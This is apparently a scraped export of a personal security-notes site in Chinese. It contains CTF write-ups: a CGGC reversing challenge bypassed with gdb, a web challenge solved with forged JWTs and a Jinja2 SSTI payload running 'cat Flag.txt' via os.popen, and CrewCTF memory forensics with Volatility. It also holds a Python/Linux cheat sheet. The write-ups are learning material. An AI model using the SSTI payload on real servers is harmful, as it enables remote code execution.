j == 3 \u0026amp;\u0026amp; input[97] == \u0026#39;5\u0026#39;; v27 = v26 + v25; v28 = j == 5 \u0026amp;\u0026amp; input[160] == \u0026#39;S\u0026#39;; v29 = v28 + v27; v30 = j == 4 \u0026amp;\u0026amp; input[128] == \u0026#39;S\u0026#39;; v31 = v30 + v29; v32 = j == 5 \u0026amp;\u0026amp; input[161] == \u0026#39;A\u0026#39;; v33 = v32 + v31; v34 = j == 6 \u0026amp;\u0026amp; input[193] == \u0026#39;2\u0026#39;; v35 = v34 + v33; v36 = j == 7 \u0026amp;\u0026amp; input[225] == \u0026#39;A\u0026#39;; v44 = v35 + v36; v47 += v35 + v36; } else { --v47; } } if ( v47 \u0026gt; 15 ) { puts(\u0026#34;[+] Stage 2: Predict the final card I draw.\u0026#34;); fgets(flag, 32LL, stdin); if ( (unsigned int)isACard((__int64)flag) \u0026amp;\u0026amp; (unsigned __int64)j_strlen_ifunc(flag) \u0026gt; 1 \u0026amp;\u0026amp; flag[0] == \u0026#39;H\u0026#39; \u0026amp;\u0026amp; flag[1] == \u0026#39;2\u0026#39; ) { printf((unsigned int)\u0026#34;Congrats! Here is your flag: \u0026#34;, 32, v38, v39, v40, v41, flag[0]); readFlag(); return 0; } else { puts(\u0026#34;You failed.\u0026#34;); return 0; } } else { puts(\u0026#34;You failed.\u0026#34;); return 0; } } :::\n:::spoiler IDA ReadFlag\nvoid __fastcall readFlag() { __int64 v0[3]; // [rsp+0h] [rbp-40h] BYREF _DWORD v1[3]; // [rsp+18h] [rbp-28h] __int64 v2; // [rsp+24h] [rbp-1Ch] int v3; // [rsp+38h] [rbp-8h] int v4; // [rsp+3Ch] [rbp-4h] v0[0] = \u0026#39;\\xD8\\xD8\\xA2\\x93\\xAB\\xAF\\xAF\\xAB\u0026#39;; v0[1] = \u0026#39;\\x86\\xB7\\x84\\x84\\xDC\\x80\\x9B\\xB7\u0026#39;; v0[2] = \u0026#39;\\xB7\\xB8\\xD9\\xA0\\x9B\\xB7\\xDF\\xD8\u0026#39;; v1[0] = \u0026#39;\\xBA\\x8B\\xDB\\xBB\u0026#39;; *(_QWORD *)\u0026amp;v1[1] = 0x8BB7D8DFB7BBDFDBLL; v2 = 0x959ADBA5D8DFBB9DLL; v4 = 0; v3 = 0; while ( v4 \u0026lt;= 44 ) { v3 = *((char *)v0 + v4); v3 ^= 0xC1E8u; *((_BYTE *)v0 + v4++) = v3; } puts(v0); } :::\nRecon # 這一題算是除了hello world以外最水的題目了吧，主要是模擬賭神中和高義對決的場警\n主要的source code行為是，他已經寫死8張牌，第一階段我們要做的事情是猜出是哪八張 第二階段是再猜出一張牌 就可以進到readFlag function中，讓他把flag給我們 但其實實際上可以用gdb bypass那些認證，直接jump就好\n$ gdb goayi gef➤ r Starting program: /mnt/d/NTU/CTF/CGGC 2023/Reverse/GaoYi/gaoyi .(\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;@, .@\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;/#\u0026amp;\u0026amp;(\u0026amp;\u0026amp;\u0026amp;%. \u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;@@\u0026amp;#%@\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;#\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;@ \u0026amp;%\u0026amp;\u0026amp;#\u0026amp;\u0026amp;@%#,,*///,,*#\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp; @\u0026amp;\u0026amp;................/%\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp; \u0026amp;\u0026amp;/,................/%\u0026amp;\u0026amp;\u0026amp;\u0026amp;. \u0026amp;@*#/,......*\u0026amp;(..,,,.,*%\u0026amp;\u0026amp; /\u0026amp;,*/\u0026amp;/.*....//\u0026amp;*/,..,,\u0026amp;\u0026amp;. *\u0026amp;,,,.../..,.........***., .(,..../..,,,......,,***.% .//*..,,,*........,,,,**\u0026amp;. */**,,,,..,,/*...,.,*/*\u0026amp;@ \u0026amp;%#########\u0026amp;@*..,,*,.....,,*/*,.%\u0026amp;#\u0026amp;@ \u0026amp;\u0026amp;%%%%#%%%%%%%\u0026amp;@....... .,(,.,,..\u0026amp;\u0026amp;##%%%%\u0026amp; %%\u0026amp;#\u0026amp;%\u0026amp;%%\u0026amp;%%%%@\u0026amp;\u0026amp;\u0026amp;\u0026amp;@%%%%#.... . \u0026amp;\u0026amp;%%%\u0026amp;%%#%%%%%# @\u0026amp;\u0026amp;\u0026amp;%\u0026amp;\u0026amp;%%%%%%%%%%\u0026amp;\u0026amp;%.. ,,, #%%%%%%%#%%%%%%%%%%\u0026amp; \u0026amp;\u0026amp;@%\u0026amp;\u0026amp;%\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;%%%%\u0026amp;\u0026amp;\u0026amp;%...*, .. /%%%%%%\u0026amp;%%%%%%%%%%%%%%% \u0026amp;#\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;%\u0026amp;%\u0026amp;\u0026amp;%%%%%\u0026amp;%%%...@#,* %%%%%%%%%%%%%%%\u0026amp;%%%%\u0026amp;%% \u0026amp;\u0026amp;%\u0026amp;@\u0026amp;@@\u0026amp;%\u0026amp;\u0026amp;\u0026amp;\u0026amp;%\u0026amp;%%\u0026amp;%%%% ,,%*/ . \u0026amp;%%%%%\u0026amp;\u0026amp;\u0026amp;%%%%%%%%%%%%%%# \u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;@@\u0026amp;\u0026amp;\u0026amp;\u0026amp;%%\u0026amp;%%%%%\u0026amp;\u0026amp; (\u0026amp;#/.\u0026amp;@... @%%%%%%\u0026amp;%%%%#%%%%%%%%%%#% Welcome to the Charitable Lag Vegas! Anyone can participate with three million US dollars. You play with 52 cards with (S)pades, (C)lub, (H)earts, (D)iamond. [+] Game 1: Predict the first 8 cards I draw in exact order. [+] Input example: \u0026#34;C8\u0026#34;. Card 1: ^C Program received signal SIGINT, Interrupt. 0x0000000000422d61 in read () Warning: \u0026#39;set logging on\u0026#39;, an alias for the command \u0026#39;set logging enabled\u0026#39;, is deprecated. Use \u0026#39;set logging enabled on\u0026#39;. gef➤ p \u0026amp;readFlag $1 = (\u0026lt;text variable, no debug info\u0026gt; *) 0x4018dc \u0026lt;readFlag\u0026gt; gef➤ j *0x4018dc Continuing at 0x4018dc. CGGC{J00_sh4ll_n07_sH1P_S3cR37S_70_cuS70M3r}� Flag: CGGC{J00_sh4ll_n07_sH1P_S3cR37S_70_cuS70M3r}\nSpace game # Recon # 這一題因為是賽後才寫WP，所以沒有甚麼太詳細的資訊可以記錄，不過這一題的確很misc，但通靈的方向屢屢受挫\n首先題目給予一個網頁型的小遊戲(算是類似七八零年代的那種飛船打外星人的那種)，然後過關的條件是要至少活到最後並且打死30個以上的敵人，但這其實根本就和解題沒關係 如果從動態看，可以看到他import一個檔案(game.gb)，misc的地方在於他把flag藏在這個檔案中，所以其實和遊戲一點關係都沒有(心累啊!!!!!) Exploit # 如果實際去看他的binary，會發現有蠻多個flag，但學長測試下來正確的是CGGC{Y0U_WIN!!123}\nFlag: CGGC{Y0U_WIN!!123}\nBossti # Background # JWT(maybe??) SSTI\nSource code # Recon # 這一題也是搞心態，一開始以為他是和jwt有關的題目，所以在第一天打的時候，有嘗試過直接把jwt token改變，但卻過不了，到了第二天用一樣的token卻有不一樣的效果，不知道是不是server有問題或是作者有更新 admin頁面 Payload: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoyLCJyb2xlIjoiYWRtaW4iLCJoYWNrIjoiIn0.kmCiItAN6q9xCmrZ1uqhZZP96_pqD5RBMp1Umv0HFKM boss頁面 Payload: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYm9zcyIsImhhY2siOiIifQ.VhS5VSRlR_RrgIlF-gdl-s1_PVHPQCxB3s8oHgwEPJ4 其實看了URLhttp://10.99.111.109:5000/admin?data={%27user_id%27%3A+2,+%27role%27%3A+%27admin%27,+%27hack%27%3A+%27%27}或http://10.99.111.109:5000/boss?data={%27user_id%27%3A+1,+%27role%27%3A+%27boss%27,+%27hack%27%3A+%27%27}才覺得應該和jwt認證沒關係，因為就算換到一個無痕頁面也一樣可以看得到，但重點是boss的頁面有給一個疑似是SSTI的提示(7*7=49經典的payload)，所以剩下的事情就是SSTI payload瘋狂輸出拿flag Exploit - SSTI # Payload: /boss?data={%27user_id%27%3A+1,+%27role%27%3A+%27boss%27,+%27hack%27%3A+%27{{self.__init__.__globals__.__builtins__.__import__(\u0026quot;os\u0026quot;).popen(\u0026quot;cat%20Flag.txt\u0026quot;).read()}}%27} Flag: CGGC{\u0026quot;S$T1_V3RY_EZ_2_Pwn3D_C0ngr4t$\u0026quot;}\n"},{"id":42,"href":"/tools/others/command-cheat-sheet/","title":"Command Cheat Sheet","section":"Tools","content":" Command Cheat Sheet # Python 基本用語 # Bytes $\\to$ Hex\n\u0026gt;\u0026gt;\u0026gt; example_str = b\u0026#39;\\x17\\x10\\x06Ar\\xe4G\\xc9\\xb5\\xd7y\\xbc\u0026#39; \u0026gt;\u0026gt;\u0026gt; example_str.hex() \u0026#39;1710064172e447c9b5d779bc\u0026#39; Hex $\\to$ String\n\u0026gt;\u0026gt;\u0026gt; bytes.fromhex(\u0026#39;68656c6c6f\u0026#39;).decode(\u0026#39;utf-8\u0026#39;) \u0026#39;hello\u0026#39; \u0026gt;\u0026gt;\u0026gt; # or \u0026gt;\u0026gt;\u0026gt; import binascii \u0026gt;\u0026gt;\u0026gt; binascii.unhexlify(\u0026#39;68656c6c6f\u0026#39;) b\u0026#39;hello\u0026#34; \u0026gt;\u0026gt;\u0026gt; # or \u0026gt;\u0026gt;\u0026gt; import codecs \u0026gt;\u0026gt;\u0026gt; decode_hex = codecs.getdecoder(\u0026#34;hex_codec\u0026#34;) \u0026gt;\u0026gt;\u0026gt; decode_hex(s)[0] b\u0026#39;hello\u0026#39; String $\\to$ Hex\n\u0026gt;\u0026gt;\u0026gt; str= \u0026#39;linuxhint\u0026#39;.encode(\u0026#39;utf-8\u0026#39;) \u0026gt;\u0026gt;\u0026gt; str.hex() \u0026#39;6c696e757868696e74\u0026#39; Hex(String Type) $\\to$ Decimal\n\u0026gt;\u0026gt;\u0026gt; a = \u0026#39;123456\u0026#39; \u0026gt;\u0026gt;\u0026gt; int(a, 16) 1193046 Decimal $\\to$ Hex\n\u0026gt;\u0026gt;\u0026gt; a = 1234 \u0026gt;\u0026gt;\u0026gt; hex(a) \u0026#39;0x4d2\u0026#39; Hex $\\to$ Binary\n\u0026gt;\u0026gt;\u0026gt; bin(int(\u0026#39;abc\u0026#39;, 16))[2:].zfill(8) \u0026#39;101010111100\u0026#39; String $\\to$ Binary :::info if you\u0026rsquo;d like to do this transformation, 1st conversion is better :::\n# string to hex to binary \u0026gt;\u0026gt;\u0026gt; bin(int(\u0026#39;I love CNS\u0026#39;.encode(\u0026#39;utf-8\u0026#39;).hex(), 16))[2:].zfill(8) \u0026#39;1001001001000000110110001101111011101100110010100100000010000110100111001010011\u0026#39; \u0026gt;\u0026gt;\u0026gt; \u0026#39;\u0026#39;.join(format(ord(x), \u0026#39;b\u0026#39;) for x in \u0026#39;I love CNS\u0026#39;) \u0026#39;10010011000001101100110111111101101100101100000100001110011101010011\u0026#39; Byte $\\to$ String\n\u0026gt;\u0026gt;\u0026gt; b\u0026#39;abc\\n\u0026#39;.decode(\u0026#39;utf-8\u0026#39;) \u0026#39;abc\\n\u0026#39; Binary $\\to$ Hex\n\u0026gt;\u0026gt;\u0026gt; hex(int(\u0026#39;010110\u0026#39;, 2)) \u0026#39;0x16\u0026#39; \u0026gt;\u0026gt;\u0026gt; hex(int(\u0026#39;0000010010001101\u0026#39;, 2)) \u0026#39;0x48d\u0026#39; Binary $\\to$ Hex $\\to$ String\ndef binToHexa(n): bnum = int(n) temp = 0 mul = 1 count = 1 hexaDeciNum = [\u0026#39;0\u0026#39;] * 100 i = 0 while bnum != 0: rem = bnum % 10 temp = temp + (rem*mul) if count % 4 == 0: if temp \u0026lt; 10: hexaDeciNum[i] = chr(temp+48) else: hexaDeciNum[i] = chr(temp+55) mul = 1 temp = 0 count = 1 i = i+1 else: mul = mul*2 count = count+1 bnum = int(bnum/10) if count != 1: hexaDeciNum[i] = chr(temp+48) if count == 1: i = i-1 hex_string = \u0026#39;\u0026#39; while i \u0026gt;= 0: hex_string += hexaDeciNum[i] i = i-1 if hex_string == \u0026#39;\u0026#39;: hex_string = \u0026#39;00\u0026#39; return hex_string plaintext_hex = binToHexa(plaintext_bin).encode().hex() print(bytes.fromhex(plaintext_hex).decode()) Decimal(int type) $\\to$ Hex(String type)\n\u0026gt;\u0026gt;\u0026gt; \u0026#39;{0:0\u0026gt;2x}\u0026#39;.format(0) \u0026#39;00\u0026#39; \u0026gt;\u0026gt;\u0026gt; \u0026#39;{0:0\u0026gt;2x}\u0026#39;.format(255) \u0026#39;ff\u0026#39; \u0026gt;\u0026gt;\u0026gt; \u0026#39;{:x}\u0026#39;.format(290275030195850039473456618367455885069965748851278076756743720446703314517401359267322769037469251445384426639837648598397) \u0026#39;7069636f4354467b6d347962335f54683073655f6d337335346733735f3472335f646966757272656e745f313737323733357d\u0026#39; String(str type) $\\iff$ Decimal\n\u0026gt;\u0026gt;\u0026gt; chr(97) \u0026#39;a\u0026#39; \u0026gt;\u0026gt;\u0026gt; ord(\u0026#39;a\u0026#39;) 97 Decimal $\\to$ Binary\n\u0026gt;\u0026gt;\u0026gt; bin(10) \u0026#39;0b1010\u0026#39; Decimal $\\to$ Bytes Type\n\u0026gt;\u0026gt;\u0026gt; bytes([10]) b\u0026#39;\\n\u0026#39; \u0026gt;\u0026gt;\u0026gt; bytes([70]) b\u0026#39;F\u0026#39; Array $\\to$ List\n\u0026gt;\u0026gt;\u0026gt; import numpy as np \u0026gt;\u0026gt;\u0026gt; a = np.array([1,2,3]) \u0026gt;\u0026gt;\u0026gt; a.tolist() [1, 2, 3] Python 組合技 # XOR Two Decimal \u0026gt;\u0026gt;\u0026gt; from itertools import cycle \u0026gt;\u0026gt;\u0026gt; def hex_xor(s1, s2): ... b = bytearray() ... for c1, c2 in zip(bytes.fromhex(s1), cycle(bytes.fromhex(s2))): ... b.append(c1 ^ c2) ... return b.hex() \u0026gt;\u0026gt;\u0026gt; s1 = \u0026#39;aaab\u0026#39; \u0026gt;\u0026gt;\u0026gt; s2 = \u0026#39;ccbc\u0026#39; \u0026gt;\u0026gt;\u0026gt; hex_xor(s1, s2) \u0026#39;6617\u0026#39; Decimal $\\to$ Ascii String \u0026gt;\u0026gt;\u0026gt; tmp = 4028375274964940959047587304025089628177332141172593013450629550958369516176531641246900741346661851279741 \u0026gt;\u0026gt;\u0026gt; bytes.fromhex(\u0026#39;{:x}\u0026#39;.format(tmp)).decode(\u0026#39;utf-8\u0026#39;) \u0026#39;picoCTF{p0ll4rd_f4ct0r1z4at10n_FTW_7c8625a1}\u0026#39; Python 酷酷的寫法 # string倒續輸出 \u0026gt;\u0026gt;\u0026gt; \u0026#34;galf\u0026#34;[::-1] \u0026#39;flag\u0026#39; 取2的補數(取有號數的負號) \u0026gt;\u0026gt;\u0026gt; import ctypes \u0026gt;\u0026gt;\u0026gt; a = 0x17c7cc6e \u0026gt;\u0026gt;\u0026gt; ctypes.c_int32(a).value 398969966 \u0026gt;\u0026gt;\u0026gt; b = 0xc158a854 \u0026gt;\u0026gt;\u0026gt; ctypes.c_int32(b).value -1051154348 Linux 奇技淫巧語法 # 設定英文+數字的亂碼 - Linux - tr語法 $ tr -dc 'a-zA-Z0-9' \u0026lt; /dev/urandom | head -c 16 計算行數 - Linux 使用 wc 指令計算字數、行數教學與範例 $ cat document.xml | wc -l 10 透過搜尋特定字串找尋哪一個file含有相關字串 - CyberDefenders: Spotlight $ grep -i -r \u0026#39;{specific strings}\u0026#39; * # grep -i -r \u0026#39;eno\u0026#39; * sort - Linux 的 sort 排序指令教學與常用範例整理 # 倒序 $ ls -l | sort -r uniq - Linux 的 uniq 指令教學與範例：刪除重複文字行、去除相同的內容 cut - Linux 的 cut 擷取部份字元、欄位指令教學與常用範例整理 # 用key word切分，再用-f選出要顯示哪一塊 $ cut -d {key word} -f {number} # cut -d \u0026#39;\u0026#34;\u0026#39; -f 6 diff - Linux diff 命令 $ diff log2013.log log2014.log -y -W 50 2013-01 2013-01 2013-02 2013-02 2013-03 | 2014-03 2013-04 2013-04 2013-05 2013-05 2013-06 2013-06 2013-07 2013-07 2013-08 | 2013-07 2013-09 2013-09 2013-10 2013-10 \u0026gt; 2013-11 \u0026gt; 2013-12 -y或--side-by-side: 以並列的方式顯示文件的異同之處 -W\u0026lt;寬度\u0026gt;或--width\u0026lt;寬度\u0026gt;: 在使用-y參數時，指定欄寬 |表示前後2個文件內容有不同 \u0026lt;表示後面文件比前面文件少了1行內容 \u0026gt;表示後面文件比前面文件多了1行內容 "},{"id":43,"href":"/problem-solutions/createprocessentrycommon_586_-create-process-not-expected-to-return/","title":"CreateProcessEntryCommon:586: Create process not expected to return","section":"Problem Solutions","content":" CreateProcessEntryCommon:586: Create process not expected to return # tags: problem solution # Problem # $ wsl Processing fstab with mount -a failed. \u0026lt;3\u0026gt;WSL (8) ERROR: CreateProcessEntryCommon:370: getpwuid(0) failed 2 \u0026lt;3\u0026gt;WSL (8) ERROR: CreateProcessEntryCommon:374: getpwuid(0) failed 2 \u0026lt;3\u0026gt;WSL (8) ERROR: CreateProcessEntryCommon:577: execvpe /bin/sh failed 2 \u0026lt;3\u0026gt;WSL (8) ERROR: CreateProcessEntryCommon:586: Create process not expected to return Solution # $ wsl -l Windows 子系統 Linux 版發佈: docker-desktop-data (預設) docker-desktop Ubuntu-20.04 $ wsl -s Ubuntu-20.04 操作順利完成。 Reference # i am getting error on windows subsystem\n"},{"id":44,"href":"/security/practice/crewctf/bad/crewctf---_-1_-questions/","title":"CrewCTF - :-1: Questions","section":"Securities","content":" Challenge: findme # Source # :::spoiler :::\nRecon # 這一題就只是找一張照片的經緯度，不二法門就是慢慢找，真TM累\nExploit # Flag: crew{35.6682,138.5699}\n"},{"id":45,"href":"/security/practice/crewctf/misc/crewctf---attaaaaack-1-13/","title":"CrewCTF - Attaaaaack 1-13","section":"Securities","content":" CrewCTF - Attaaaaack 1-13 # :::spoiler TOC [TOC] :::\nOne of our employees at the company complained about suspicious behavior on the machine, our IR team took a memory dump from the machine and we need to investigate it.\n==Attaaaaack 1== # Q1. What is the best profile for the the machine?\nExploit # $ volatility_2.6_win64_standalone.exe -f memdump.raw imageinfo Volatility Foundation Volatility Framework 2.6 INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86 AS Layer1 : IA32PagedMemoryPae (Kernel AS) AS Layer2 : FileAddressSpace (D:\\NTU\\CTF\\CrewCTF\\Misc\\Attaaaaack\\memdump.raw) PAE type : PAE DTB : 0x185000L KDBG : 0x82b7ab78L Number of Processors : 1 Image Type (Service Pack) : 1 KPCR for CPU 0 : 0x80b96000L KUSER_SHARED_DATA : 0xffdf0000L Image date and time : 2023-02-20 19:10:54 UTC+0000 Image local date and time : 2023-02-20 21:10:54 +0200 Flag: crew{Win7SP1x86_23418}\n==Attaaaaack 2== # Q2. How many processes were running ? (number)\nExploit # :::spoiler Command Result\n$ volatility_2.6_win64_standalone.exe -f memdump.raw --profile Win7SP1x86_23418 pslist Volatility Foundation Volatility Framework 2.6 Offset(V) Name PID PPID Thds Hnds Sess Wow64 Start Exit ---------- -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------ 0x8419c020 System 4 0 89 536 ------ 0 2023-02-20 19:01:19 UTC+0000 0x962f2020 smss.exe 268 4 2 29 ------ 0 2023-02-20 19:01:19 UTC+0000 0x860a8c78 csrss.exe 352 344 9 462 0 0 2023-02-20 19:01:20 UTC+0000 0x855dfd20 wininit.exe 404 344 3 76 0 0 2023-02-20 19:01:20 UTC+0000 0x8550b030 csrss.exe 416 396 9 268 1 0 2023-02-20 19:01:20 UTC+0000 0x85ea2368 services.exe 480 404 8 220 0 0 2023-02-20 19:01:20 UTC+0000 0x85ea8610 lsass.exe 488 404 6 568 0 0 2023-02-20 19:01:20 UTC+0000 0x85eab718 lsm.exe 496 404 10 151 0 0 2023-02-20 19:01:20 UTC+0000 0x85eacb80 winlogon.exe 508 396 5 115 1 0 2023-02-20 19:01:20 UTC+0000 0x85f4d030 svchost.exe 632 480 10 357 0 0 2023-02-20 19:01:21 UTC+0000 0x85ef0a90 svchost.exe 700 480 8 280 0 0 2023-02-20 19:01:21 UTC+0000 0x919e2958 svchost.exe 752 480 22 507 0 0 2023-02-20 19:01:21 UTC+0000 0x85f9c3a8 svchost.exe 868 480 13 309 0 0 2023-02-20 19:01:21 UTC+0000 0x85fae030 svchost.exe 908 480 18 715 0 0 2023-02-20 19:01:21 UTC+0000 0x85fb7670 svchost.exe 952 480 34 995 0 0 2023-02-20 19:01:22 UTC+0000 0x85ff1380 svchost.exe 1104 480 18 391 0 0 2023-02-20 19:01:22 UTC+0000 0x8603a030 spoolsv.exe 1236 480 13 270 0 0 2023-02-20 19:01:22 UTC+0000 0x86071818 svchost.exe 1280 480 19 312 0 0 2023-02-20 19:01:22 UTC+0000 0x860b73c8 svchost.exe 1420 480 10 146 0 0 2023-02-20 19:01:22 UTC+0000 0x860ba030 taskhost.exe 1428 480 9 205 1 0 2023-02-20 19:01:22 UTC+0000 0x861321c8 dwm.exe 1576 868 5 114 1 0 2023-02-20 19:01:23 UTC+0000 0x8613c030 explorer.exe 1596 1540 29 842 1 0 2023-02-20 19:01:23 UTC+0000 0x841d7500 VGAuthService. 1636 480 3 84 0 0 2023-02-20 19:01:23 UTC+0000 0x86189d20 vmtoolsd.exe 1736 1596 8 179 1 0 2023-02-20 19:01:23 UTC+0000 0x8619dd20 vm3dservice.ex 1848 480 4 60 0 0 2023-02-20 19:01:24 UTC+0000 0x861a9030 vmtoolsd.exe 1884 480 13 290 0 0 2023-02-20 19:01:24 UTC+0000 0x861b5360 vm3dservice.ex 1908 1848 2 44 1 0 2023-02-20 19:01:24 UTC+0000 0x861fc700 svchost.exe 580 480 6 91 0 0 2023-02-20 19:01:25 UTC+0000 0x86261030 WmiPrvSE.exe 1748 632 10 204 0 0 2023-02-20 19:01:25 UTC+0000 0x86251bf0 dllhost.exe 400 480 15 196 0 0 2023-02-20 19:01:26 UTC+0000 0x8629e518 msdtc.exe 2168 480 14 158 0 0 2023-02-20 19:01:31 UTC+0000 0x8629e188 SearchIndexer. 2276 480 12 581 0 0 2023-02-20 19:01:31 UTC+0000 0x8630b228 wmpnetwk.exe 2404 480 9 212 0 0 2023-02-20 19:01:32 UTC+0000 0x862cca38 svchost.exe 2576 480 15 232 0 0 2023-02-20 19:01:33 UTC+0000 0x85351030 WmiPrvSE.exe 3020 632 11 242 0 0 2023-02-20 19:01:45 UTC+0000 0x853faac8 ProcessHacker. 3236 1596 9 416 1 0 2023-02-20 19:02:37 UTC+0000 0x843068f8 sppsvc.exe 2248 480 4 146 0 0 2023-02-20 19:03:25 UTC+0000 0x85f89640 svchost.exe 2476 480 13 369 0 0 2023-02-20 19:03:25 UTC+0000 0x843658d0 cmd.exe 2112 2876 1 20 1 0 2023-02-20 19:03:40 UTC+0000 0x84368798 cmd.exe 2928 2876 1 20 1 0 2023-02-20 19:03:40 UTC+0000 0x84365c90 conhost.exe 1952 416 2 49 1 0 2023-02-20 19:03:40 UTC+0000 0x84384d20 conhost.exe 2924 416 2 49 1 0 2023-02-20 19:03:40 UTC+0000 0x84398998 runddl32.exe 300 2876 10 2314 1 0 2023-02-20 19:03:40 UTC+0000 0x84390030 notepad.exe 2556 300 2 58 1 0 2023-02-20 19:03:41 UTC+0000 0x84df2458 audiodg.exe 1556 752 6 129 0 0 2023-02-20 19:10:50 UTC+0000 0x84f1caf8 DumpIt.exe 2724 1596 2 38 1 0 2023-02-20 19:10:52 UTC+0000 0x84f3d878 conhost.exe 3664 416 2 51 1 0 2023-02-20 19:10:52 UTC+0000 :::\nFlag: 47\n==Attaaaaack 3== # Q3. i think the user left note on the machine. can you find it ?\nRecon # 這一題真的要通靈，看到note第一直覺應該是想到要看有沒有類似notepad這樣的文字編輯器，果不其然pslist有這個process，所以可以把該process的memory dump出來，然後strings search再grep特定的regular expression，不過這邊有一個需要通靈的地方，就是通靈regular expression的形式，還必須要注意strings的形式是16 bits和little endian的形式才找的到，上述方法是參考1，另外一個方法是可以通靈到作者有可能會把字串暫存在clipboard上，這樣就可以搭配clipboard這個plugin，可以直接print出clipboard中的內容\nExploit # 方法一 $ volatility_2.6_win64_standalone.exe -f memdump.raw --profile Win7SP1x86_23418 clipboard Volatility Foundation Volatility Framework 2.6 Session WindowStation Format Handle Object Data ---------- ------------- ------------------ ---------- ---------- -------------------------------------------------- 1 WinSta0 CF_UNICODETEXT 0xa00d9 0xfe897838 1_l0v3_M3m0ry_F0r3ns1cs_S0_muchhhhhhhhh 1 WinSta0 0x0L 0x10 ---------- 1 WinSta0 0x2000L 0x0 ---------- 1 WinSta0 0x0L 0x3000 ---------- 1 ------------- ------------------ 0x1a02a9 0xfe670a68 1 ------------- ------------------ 0x100067 0xffbab448 方法二 $ volatility_2.6_win64_standalone.exe -f memdump.raw --profile Win7SP1x86_23418 pslist | findstr notepad Volatility Foundation Volatility Framework 2.6 0x84390030 notepad.exe 2556 300 2 58 1 0 2023-02-20 19:03:41 UTC+0000 $ volatility_2.6_win64_standalone.exe -f memdump.raw --profile Win7SP1x86_23418 memdump --pid 2556 -D .\\output $ strings -el 2556.dmp | grep -E \u0026#34;(.*?)_(.*?)_\u0026#34; ... _040515AD\u0026amp;REV_00 PCI\\VEN_15AD\u0026amp;DEV_0405\u0026amp;SUBSYS_040515AD\u0026amp;REV_TERMINAL CI\\VEN_15AD\u0026amp;DEV_0405\u0026amp;CC_0300 DEV_0405\u0026amp;CC_030000 PCI\\VEN_15AD\u0026amp;DEV_0405\u0026amp;CC_0300 1_l0v3_M3m0ry_F0r3ns1cs_S0_muchhhhhhhhh EN_15AD\u0026amp;DEV_0405\u0026amp;CC_0300 \\??\\HID#VID_0E0F\u0026amp;PID_0003\u0026amp;MI_00#8\u0026amp;167f267\u0026amp;0\u0026amp;0000#{378de44c-56ef-11d1-bc8c-00a0c91405dd} \\??\\IDE#CdRomNECVMWar_VMware_SATA_CD01_______________1.00____#6\u0026amp;22d3c06\u0026amp;0\u0026amp;1.0.0#{53f56308-b6bf-11d0-94f2-00a0c91efb8b} \\??\\HID#VID_0E0F\u0026amp;PID_0003\u0026amp;MI_01#8\u0026amp;226f4b5b\u0026amp;0\u0026amp;0000#{378de44c-56ef-11d1-bc8c-00a0c91405dd} Flag: crew{1_l0v3_M3m0ry_F0r3ns1cs_S0_muchhhhhhhhh}\n==Attaaaaack 4== # Q4. What is the name and PID of the suspicious process ? example : crew{abcd.exe_111}\nRecon # 因為是賽後解，所以其實\u0026hellip;如果是線上解的話可以try\u0026amp;error，反正這一題也是頗單純，如果觀察pslist的process，會發現有一個runddl32.exe他就是在模仿rundll32，所以這就是一個怪可疑的process\nExploit # Flag: crew{runddl32.exe_300}\n==Attaaaaack 5== # Q5. What is the another process that is related to this process and it\u0026rsquo;s strange ? example : crew{spotify.exe}\nExploit # $ volatility_2.6_win64_standalone.exe -f memdump.raw --profile Win7SP1x86_23418 pslist Volatility Foundation Volatility Framework 2.6 Offset(V) Name PID PPID Thds Hnds Sess Wow64 Start Exit ---------- -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------ ... 0x84398998 runddl32.exe 300 2876 10 2314 1 0 2023-02-20 19:03:40 UTC+0000 0x84390030 notepad.exe 2556 300 2 58 1 0 2023-02-20 19:03:41 UTC+0000 ... Flag: crew{notepad.exe}\n==Attaaaaack 6== # Q6. What is the full path (including executable name) of the hidden executable? example : crew{C:\\Windows\\System32\\abc.exe}\nRecon # 這一題指的是runddl32.exe在哪邊，就直接filescan然後string search就找到了\nExploit # $ volatility_2.6_win64_standalone.exe -f memdump.raw --profile Win7SP1x86_23418 filescan | findstr runddl32.exe Volatility Foundation Volatility Framework 2.6 0x0000000024534f80 5 0 R--r-d \\Device\\HarddiskVolume1\\Users\\0XSH3R~1\\AppData\\Local\\Temp\\MSDCSC\\runddl32.exe 0x000000003ea44038 8 0 RWD--- \\Device\\HarddiskVolume1\\Users\\0XSH3R~1\\AppData\\Local\\Temp\\MSDCSC\\runddl32.exe Flag: crew{C:\\Users\\0XSH3R~1\\AppData\\Local\\Temp\\MSDCSC\\runddl32.exe}\n==Attaaaaack 7== # Q7. What is the API used by the malware to retrieve the status of a specified virtual key on the keyboard ? flag format: crew{AbcDef}\nRecon # 仔細分析題目的話，會知道他要我們找出malware使用哪個API(method/function)取得keyboard上的虛擬按鍵，所以直覺的做法是直接把該執行檔dump出來，然後string search這隻檔案有哪些和key相關的東西\nExploit # 如果把該支malware丟到virustotal後，結果可以看這邊\n$ volatility_2.6_win64_standalone.exe -f memdump.raw --profile Win7SP1x86_23418 procdump --pid 300 -D .\\output Volatility Foundation Volatility Framework 2.6 Process(V) ImageBase Name Result ---------- ---------- -------------------- ------ 0x84398998 0x00400000 runddl32.exe OK: executable.300.exe $ strings executable.300.exe | grep -i key 